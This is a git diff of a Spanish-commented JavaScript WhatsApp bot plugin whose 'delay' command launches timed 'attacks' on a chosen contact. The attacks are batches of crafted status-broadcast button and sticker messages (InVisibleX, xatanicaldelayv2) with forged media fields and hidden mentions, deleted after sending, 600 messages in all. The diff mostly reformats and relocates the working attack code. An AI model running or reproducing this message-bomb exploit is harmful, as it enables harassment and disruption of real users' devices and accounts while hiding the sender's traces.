@@ -22,7 +22,7 @@ let handler = async (m, { conn }) => {
         enviarTanda(conn, jid, round + 1, m, '2');
       }, round * 30000);
     }
-  }, 600000); // 10 min
+  }, 600000);
 
   // ⏳ Ataque 3 (a los 20 min)
   setTimeout(() => {
@@ -33,50 +33,25 @@ let handler = async (m, { conn }) => {
       }, round * 30000);
     }
 
-    // 🎯 Mensaje final
+    // ✅ Mensaje final
     setTimeout(() => {
       conn.sendMessage(m.chat, {
         text: '🎯 Ataque finalizado. 600 mensajes enviados en total.',
       }, { quoted: m });
-    }, 300000); // 5 minutos después del inicio del ataque 3
+    }, 300000);
 
-  }, 1200000); // 20 minutos
+  }, 1200000); // a los 20 minutos
 };
 
 handler.command = /^delay$/i;
 export default handler;
 
-// 📤 Enviar una tanda de 20 mensajes
-async function enviarTanda(conn, jid, num, m, ciclo) {
-  try {
-    for (let i = 0; i < 20; i++) {
-      const m1 = await InVisibleX(conn, jid, true);
-      const m2 = await xatanicaldelayv2(conn, jid, true);
-
-      await conn.sendMessage(conn.user.id, { delete: m1.key });
-      await conn.sendMessage(conn.user.id, { delete: m2.key });
-
-      await delay(1000);
-    }
-
-    await conn.sendMessage(m.chat, {
-      text: `✅ Tanda ${num}/10 del ataque ${ciclo} enviada.`,
-    }, { quoted: m });
-
-  } catch (e) {
-    console.error("❌ Error en tanda:", e);
-    await conn.sendMessage(m.chat, {
-      text: "❌ Error en tanda:\n" + e.message,
-    }, { quoted: m });
-  }
-}
-
-// 💤 Delay simple
+// ✅ Delay utilitario
 function delay(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// 💣 InVisibleX
+// ✅ Función InVisibleX
 async function InVisibleX(sock, jid, mention) {
   const msg = await generateWAMessageFromContent(jid, {
     buttonsMessage: {
@@ -99,19 +74,15 @@ async function InVisibleX(sock, jid, mention) {
   await sock.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
     statusJidList: [jid],
-    additionalNodes: [
-      {
-        tag: "meta",
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
         attrs: {},
-        content: [
-          {
-            tag: "mentioned_users",
-            attrs: {},
-            content: [{ tag: "to", attrs: { jid: jid }, content: undefined }],
-          },
-        ],
-      },
-    ],
+        content: [{ tag: "to", attrs: { jid: jid }, content: undefined }],
+      }],
+    }],
   });
 
   if (mention) {
@@ -120,31 +91,29 @@ async function InVisibleX(sock, jid, mention) {
         message: { protocolMessage: { key: msg.key, type: 25 } },
       },
     }, {
-      additionalNodes: [
-        {
-          tag: "meta",
-          attrs: { is_status_mention: "hmmm" },
-          content: undefined,
-        },
-      ],
+      additionalNodes: [{
+        tag: "meta",
+        attrs: { is_status_mention: "hmmm" },
+        content: undefined,
+      }],
     });
   }
 
   return msg;
 }
 
-// 💣 xatanicaldelayv2
+// ✅ Función xatanicaldelayv2
 async function xatanicaldelayv2(sock, jid, mention) {
   const message = {
     viewOnceMessage: {
       message: {
         stickerMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
+          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
           fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
           fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
           mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
           mimetype: "image/webp",
-          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+          directPath: "/v/t62.7161-24/...",
           fileLength: { low: 1, high: 0, unsigned: true },
           mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
           firstFrameLength: 19904,
@@ -157,15 +126,8 @@ async function xatanicaldelayv2(sock, jid, mention) {
                 "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
               ),
             ],
-            groupMentions: [],
-            entryPointConversionSource: "non_contact",
-            entryPointConversionApp: "whatsapp",
-            entryPointConversionDelaySeconds: 467593,
           },
           stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
-          isAvatar: false,
-          isAiSticker: false,
-          isLottie: false,
         },
       },
     },
@@ -175,20 +137,41 @@ async function xatanicaldelayv2(sock, jid, mention) {
   await sock.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
     statusJidList: [jid],
-    additionalNodes: [
-      {
-        tag: "meta",
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
         attrs: {},
-        content: [
-          {
-            tag: "mentioned_users",
-            attrs: {},
-            content: [{ tag: "to", attrs: { jid: jid }, content: undefined }],
-          },
-        ],
-      },
-    ],
+        content: [{ tag: "to", attrs: { jid: jid }, content: undefined }],
+      }],
+    }],
   });
 
   return msg;
+}
+
+// ✅ Función que antes fallaba por estar mal ubicada
+async function enviarTanda(conn, jid, num, m, ciclo) {
+  try {
+    for (let i = 0; i < 20; i++) {
+      const m1 = await InVisibleX(conn, jid, true);
+      const m2 = await xatanicaldelayv2(conn, jid, true);
+
+      await conn.sendMessage(conn.user.id, { delete: m1.key });
+      await conn.sendMessage(conn.user.id, { delete: m2.key });
+
+      await delay(1000);
+    }
+
+    await conn.sendMessage(m.chat, {
+      text: `✅ Tanda ${num}/10 del ataque ${ciclo} enviada.`,
+    }, { quoted: m });
+
+  } catch (e) {
+    console.error("❌ Error en tanda:", e);
+    await conn.sendMessage(m.chat, {
+      text: "❌ Error en tanda:\n" + e.message,
+    }, { quoted: m });
+  }
 }
